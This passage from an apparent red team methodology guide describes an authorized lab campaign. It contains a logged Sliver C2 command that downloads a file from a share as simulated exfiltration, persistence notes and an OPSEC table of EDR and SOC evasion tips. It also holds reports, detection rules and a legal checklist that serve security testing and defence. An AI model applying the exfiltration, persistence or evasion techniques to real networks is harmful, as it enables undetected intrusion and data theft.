# Timestamp: 2024-03-16T09:00:00Z
# Action: Access planted flag on FILE01 (Objective 3)

# Access file share
type \\FILE01\Confidential\Flag_RedTeam2024.txt
# Content: FLAG{RedTeam_Corp_Campaign_2024_Complete}
# OBJECTIVE 3 COMPLETE: Planted flag retrieved

# Timestamp: 2024-03-18T14:00:00Z
# Action: Simulate data exfiltration (Objective 5)
# Stage flag file and exfiltrate via HTTPS to C2
sliver (SQL_BEACON) > download \\FILE01\Confidential\Flag_RedTeam2024.txt /opt/campaign/objectives/
# OBJECTIVE 5 COMPLETE: Data exfiltration simulated
```

**Phase 9: Persistence and Dwell Time (Day 14-23)**

```bash
# Timestamp: 2024-03-14T15:00:00Z
# Action: Establish persistence for dwell time objective

# WMI Event Subscription on WS01 (survives reboot)
# Scheduled Task on SQL01 (masquerading as SQL maintenance)
# Both configured with 24-hour sleep to minimize noise

# Day 23 (2024-03-23T11:00:00Z): SOC analyst notices anomalous SMB connection
# from WS01 to DC01 during routine log review. Escalates to IR team.
# OBJECTIVE 4 COMPLETE: 23 days undetected (target was >14 days)
```

### 10.3 Executive Report (Lab Campaign)

```markdown
# Red Team Assessment — Executive Summary
## Corp.Local Lab Environment | March 1-25, 2024

### Engagement Overview
A red team assessment was conducted to evaluate Corp.Local's ability to 
detect and respond to a targeted adversary. The engagement emulated APT29 
(Russian SVR) tactics, beginning with spearphishing and culminating in 
complete domain compromise.

### Results Summary
| Objective | Status | Days to Achieve |
|-----------|--------|----------------|
| Domain Admin access | Achieved | 14 |
| Financial database access | Achieved | 18 |
| Planted flag exfiltration | Achieved | 20 |
| Undetected >14 days | Achieved | 23 days |
| Backup infrastructure compromise | Not Achieved | N/A |

### Critical Risk: The organization can be fully compromised from a single 
phishing email in under two weeks with no detection.

### Immediate Actions Required:
1. Enforce MFA on all accounts (eliminates credential-only attacks)
2. Deploy Credential Guard on endpoints (prevents LSASS dumping)
3. Review and restrict Kerberos delegation configurations
4. Implement network segmentation between workstation and server tiers
```

### 10.4 Technical Report (Lab Campaign — Abbreviated)

```markdown
# Technical Report — Operation Lab Storm
## Campaign Duration: 2024-03-01 to 2024-03-25

### Attack Path Summary
Phishing (john.smith) → WS01 Foothold → AD Enumeration → Kerberoast (svc_sql) 
→ Lateral to SQL01 → Constrained Delegation Abuse → Domain Admin → Objective Access

### Technique Coverage

| Phase | Technique | ATT&CK ID | Detected? |
|-------|-----------|-----------|-----------|
| Initial Access | Spearphishing | T1566.001 | No |
| Execution | PowerShell | T1059.001 | No |
| Persistence | WMI Subscription | T1546.003 | No |
| Credential Access | Kerberoasting | T1558.003 | No |
| Lateral Movement | WMI | T1047 | No |
| Privilege Escalation | Constrained Delegation | T1134.001 | No |
| Collection | Data from Shares | T1039 | Yes (Day 23) |

### Detection Gap Analysis
- 1/7 techniques detected (14% detection rate)
- Mean time to first detection: 23 days
- SOC detection was coincidental (routine log review, not rule-triggered)
- No automated alerts fired during entire 23-day campaign
- Kerberoasting generated Event ID 4769 but no alerting rule existed
- WMI lateral movement generated Event ID 4648 but was lost in noise
```

### 10.5 Purple Team Debrief (Lab Campaign)

```markdown
# Purple Team Debrief Notes
## Date: 2024-03-26 | Attendees: Red Team, Blue Team, SOC

### Technique-by-Technique Walkthrough

#### T1566.001 — Phishing
- Red: Sent 5 emails from lookalike domain "corp-target-secure.com"
- Blue: Email gateway did not flag — domain was categorized as "Technology"
- Gap: No lookalike domain detection, no new domain alerting
- Fix: Deploy homoglyph detection rule + alert on domains <30 days old
- Retest: April 15, 2024

#### T1558.003 — Kerberoasting  
- Red: Requested TGS for svc_sql via standard Kerberos protocol
- Blue: Event 4769 generated but not alerting
- Gap: SIEM rule for Kerberoast detection not deployed
- Fix: Deploy rule: Event 4769 where Ticket Encryption Type = 0x17 (RC4)
  AND Service Name != krbtgt AND Service Name does not end with $
- Retest: April 15, 2024

#### T1047 — WMI Lateral Movement
- Red: wmiexec.py created WMI process on SQL01 from WS01
- Blue: Event 4648 (explicit credential logon) generated, lost in volume
- Gap: No baseline for inter-workstation WMI. Too much noise from admin tools.
- Fix: Whitelist known admin jumphosts; alert on WMI from workstation tier
- Retest: April 22, 2024

### New Detection Rules Developed During Debrief
1. Kerberoasting: 4769 + RC4 + non-machine account = HIGH alert
2. Anomalous WMI: Process creation via WMI from non-admin source = MEDIUM alert  
3. Constrained Delegation abuse: 4769 with S4U2Proxy flag from non-DC = CRITICAL alert
4. LSASS access: Sysmon Event 10 on lsass.exe from non-whitelisted process = HIGH alert

### Retesting Schedule
- Wave 1 (April 15): Re-run Kerberoasting, Phishing with new rules active
- Wave 2 (April 22): Re-run WMI lateral movement, LSASS dumping
- Wave 3 (May 1): Full mini-campaign (2-day abbreviated red team)
```

### 10.6 Campaign Timeline (Full)

```
Campaign: Operation Lab Storm
Duration: 2024-03-01 to 2024-03-25
────────────────────────────────────────────────────────────────────────
Day  Date         Time (UTC)  Action                              Status
────────────────────────────────────────────────────────────────────────
 1   2024-03-01   09:15       OSINT enumeration begins            ✓
 1   2024-03-01   14:00       External perimeter scan             ✓
 2   2024-03-02   10:00       C2 infrastructure deployed          ✓
 2   2024-03-02   15:00       Phishing infrastructure deployed    ✓
 3   2024-03-03   09:00       Phishing emails crafted/tested      ✓
 4   2024-03-04   14:30       Phishing campaign launched          ✓
 4   2024-03-04   16:45       Credential captured (john.smith)    ✓
 4   2024-03-04   17:00       Initial foothold on WS01            ✓
 5   2024-03-05   09:00       AD enumeration from WS01            ✓
 5   2024-03-05   11:00       BloodHound collection               ✓
 6   2024-03-06   10:00       Attack path analysis                ✓
 7   2024-03-07   09:00       Additional OSINT (internal)         ✓
 8   2024-03-08   10:30       Kerberoasting svc_sql               ✓
 8   2024-03-08   11:00       svc_sql password cracked            ✓
 9   2024-03-09   --:--       Operational pause (weekend)         ✓
10   2024-03-10   13:00       Lateral movement to SQL01           ✓
10   2024-03-10   14:00       Credential dump on SQL01            ✓
11   2024-03-11   10:00       Constrained delegation analysis     ✓
12   2024-03-12   09:30       S4U attack → Domain Admin           ✓ OBJ1
13   2024-03-13   09:00       Persistence established (WMI+Task)  ✓
14   2024-03-14   11:00       Financial DB access demonstrated    ✓ OBJ2
16   2024-03-16   09:00       File share flag captured            ✓ OBJ3
18   2024-03-18   14:00       Data exfiltration simulated         ✓ OBJ5
23   2024-03-23   11:00       SOC detects anomalous SMB           ! 
23   2024-03-23   14:00       SOC escalates to IR team            ✓ OBJ4
25   2024-03-25   09:00       Campaign formally concluded         ✓
26   2024-03-26   09:00       Purple team debrief conducted       ✓
────────────────────────────────────────────────────────────────────────
Objectives: 4/5 achieved | 1 not achieved (backup infra well-segmented)
Detection: Day 23 (23 days dwell time)
Techniques used: 12 | Techniques detected: 1 (8.3% detection rate)
```

---

## Appendix A: Quick Reference — Tools and Frameworks

| Category | Tool | Purpose | License |
|----------|------|---------|---------|
| C2 | Cobalt Strike | Commercial red team platform | Commercial |
| C2 | Sliver | Open-source C2 | BSD-3 |
| C2 | Mythic | Multi-agent C2 framework | BSD-3 |
| C2 | Havoc | Post-exploitation C2 | GPL-3 |
| AD Enum | BloodHound | Attack path visualization | GPL-3 |
| AD Attack | Rubeus | Kerberos abuse toolkit | BSD-3 |
| AD Attack | Mimikatz | Credential extraction | CC BY-NC-SA 4.0 |
| AD Attack | Impacket | Python network protocol toolkit | Apache 2.0 |
| AD Attack | Certipy | AD CS abuse toolkit | MIT |
| Phishing | GoPhish | Phishing framework | MIT |
| Pivoting | Chisel | TCP/UDP tunneling | MIT |
| Pivoting | Ligolo-ng | Advanced tunneling | GPL-3 |
| Emulation | Atomic Red Team | Technique testing | MIT |
| Emulation | CALDERA | Automated emulation | Apache 2.0 |
| Infra | Terraform | Infrastructure as code | BSL 1.1 |

## Appendix B: OPSEC Failures — Lessons Learned

| Failure | Consequence | Prevention |
|---------|-------------|-----------|
| Default Cobalt Strike profile | Signature match by EDR/IDS | Always use custom malleable C2 profile |
| Uncategorized domain | Web proxy blocks access | Age domains >30 days and get categorized |
| Beacon at 3am local time | SOC analyst notices anomalous pattern | Match beacon timing to business hours |
| Tool dropped to disk | AV/EDR quarantine and alert | In-memory execution only |
| Single C2 channel | Loss of access when infrastructure burned | Multiple independent C2 channels (long-haul + interactive) |
| Operator typing errors in victim shell | Suspicious failed commands in logs | Copy-paste prepared commands only |
| Scanning from compromised host | Network anomaly detection fires | Use native tools (net, nltest, powershell) for recon |
| Same payload for multiple targets | Single detection burns all access | Unique payloads per target |

## Appendix C: Legal Considerations Checklist

```
Before Campaign Start:
[ ] Written authorization from asset owner (C-level or board)
[ ] Scope document signed by authorized representative
[ ] Rules of engagement agreed and signed
[ ] Insurance coverage verified (E&O, professional liability)
[ ] Emergency contacts established (both parties)
[ ] Deconfliction procedure documented
[ ] Data handling agreement in place
[ ] Third-party authorization obtained (cloud providers, ISPs)
[ ] Local legal counsel consulted on computer fraud laws
[ ] NDA executed (bidirectional)

During Campaign:
[ ] Activity log maintained with UTC timestamps
[ ] Deconfliction artifacts embedded in all payloads
[ ] No real PII/PHI/PCI data exfiltrated
[ ] Scope boundaries respected
[ ] Unintended access documented and reported
[ ] Evidence handled with chain-of-custody procedures

After Campaign:
[ ] All implants/persistence removed and verified
[ ] All data encrypted and retention clock started
[ ] Reports delivered via secure channel
[ ] Data destruction scheduled (per agreement)
[ ] Lessons learned documented
[ ] Retesting schedule agreed
```

---

*This document covers red team operations methodology for authorized security assessments. All techniques described require explicit written authorization before use. Unauthorized use of these techniques violates computer fraud and abuse laws in most jurisdictions. Always operate within legal and ethical boundaries.*
